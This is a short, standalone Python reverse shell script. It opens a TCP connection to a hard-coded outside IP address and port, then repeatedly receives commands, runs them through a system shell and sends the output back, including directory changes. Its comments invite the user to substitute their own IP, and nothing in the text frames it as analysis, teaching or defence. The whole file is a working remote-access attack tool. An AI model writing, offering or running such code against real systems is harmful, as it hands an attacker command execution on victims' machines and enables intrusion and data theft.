import socket
import subprocess
import os

HOST = '92.247.214.122'  # Replace with your IP
PORT = 9876              # Replace with your port

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

while True:
    try:
        # Get the current working directory
        cwd = os.getcwd()
        # Send the current working directory to the client
        s.send(f"{cwd} > ".encode())

        # Receive command
        command = s.recv(1024).decode().strip()
        if command.lower() == "exit":
            break

        # Handle 'cd' command
        if command.startswith("cd "):
            try:
                # Change the directory
                path = command[3:].strip()
                os.chdir(path)
                s.send(b"[+] Directory changed successfully.\n")
            except Exception as e:
                s.send(f"[-] Error changing directory: {str(e)}\n".encode())
        else:
            # Execute the command
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            output = result.stdout + result.stderr

            # Send back the output
            if output:
                s.send(output.encode())
            else:
                s.send(b"[+] Command executed with no output.\n")

    except Exception as e:
        s.send(f"[-] Error: {str(e)}\n".encode())

s.close()
